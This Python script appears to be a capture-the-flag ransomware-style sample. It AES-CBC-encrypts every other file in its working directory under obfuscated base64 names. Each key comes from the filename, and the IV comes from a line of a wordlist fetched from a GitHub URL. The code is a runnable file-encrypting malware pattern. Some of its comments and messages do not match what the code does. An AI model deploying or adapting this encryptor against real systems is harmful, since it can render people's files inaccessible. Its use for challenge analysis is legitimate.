


import os
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_file(file_path, output, key):
    # Generate a random initialization vector (IV)
    IV = gen_IV()
    
    # Create an AES cipher object with the given key and IV
    cipher = AES.new(key, AES.MODE_CBC, IV)
    
    # Read the file data
    with open(file_path, 'rb') as file:
        file_data = file.read()
    
    # Pad the data to be a multiple of AES block size
    padded_data = pad(file_data, AES.block_size)
    
    # Encrypt the data
    encrypted_data = cipher.encrypt(padded_data)
    
    # Write the IV and encrypted data to a new file
    with open(output, 'wb') as enc_file:
        enc_file.write(encrypted_data)
    
    print(f'File encrypted and saved as {file_path}.enc')

def download_file(url, local_filename):
    """Download file from a URL to a local file."""
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(local_filename, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
    else:
        print(f"Failed to download file. Status code: {response.status_code}")
def read_nth_line(file_path, n):
    """Read the nth line from a file."""
    try:
        with open(file_path, 'r', encoding='latin-1') as file:
            lines = file.readlines()
            if n <= len(lines):
                return lines[n-1].strip()
            else:
                return "Line number exceeds the number of lines in the file."
    except FileNotFoundError:
        return "File not found."
    except Exception as e:
        return f"An error occurred: {e}"
def delete_file(file_path):
    """Delete the specified file."""
    try:
        os.remove(file_path)
        print(f"File {file_path} deleted successfully.")
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while deleting the file: {e}")

def URL():
    return "https://raw.githubusercontent.com/ptr173/_/main/$.txt"

def line():
    return 965374

def gen_name(filename):
    url = URL()
    file = "rockyou.txt"
    download_file(url, file)
    n = 965374
    line = read_nth_line(file, n)
    name =''
    for i in range(len(filename)):
        res = ord(filename[i]) ^ ord(line[i % len(line)])
        name += chr(res)
    delete_file(file)
    name_bytes = name.encode('latin1')
    encoded_name = base64.b64encode(name_bytes)
    return encoded_name

def gen_IV():
    url = URL()
    file = "rockyou.txt"
    download_file(url, file)
    key = read_nth_line(file, line())
    delete_file(file)
    # Ensure the IV is in bytes and has the correct length (16 bytes)
    iv = key.encode('latin1')
    return iv.ljust(16, b'\x00')[:16]

def gen_key(filename):
    key = ''
    length = len(filename)
    for i in range(16):
        key += filename[i % length]
    # Convert the key to bytes
    return key.ljust(16, '\x00').encode('latin1')

def main():
    directory = '.'
    script_name = os.path.basename(__file__)
    for filename in os.listdir(directory):
        if os.path.isfile(filename) and filename != script_name:
            key=gen_key(filename)
            name=gen_name(filename)
            print(key)
            input_file = filename
            output_file = name
            encrypt_file(input_file, output_file, key)
            print(f'File {input_file} encrypted to {output_file}')

if __name__ == "__main__":
    main()

#slighly different because there is a modified in the chall file